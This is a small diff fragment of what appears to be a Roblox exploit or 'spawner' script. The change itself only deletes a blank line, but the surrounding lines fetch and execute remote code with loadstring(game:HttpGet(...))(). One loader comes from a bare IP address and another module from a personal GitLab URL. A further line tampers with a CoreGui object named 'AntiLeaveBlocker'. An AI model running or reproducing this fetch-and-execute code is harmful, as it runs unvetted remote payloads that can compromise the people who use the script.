@@ -4,7 +4,6 @@ loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()
 local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
 Spawner.Load()
 
-
 pcall(function()
 	if game.CoreGui:FindFirstChild("AntiLeaveBlocker") then
 		game.CoreGui.AntiLeaveBlocker:Destroy()
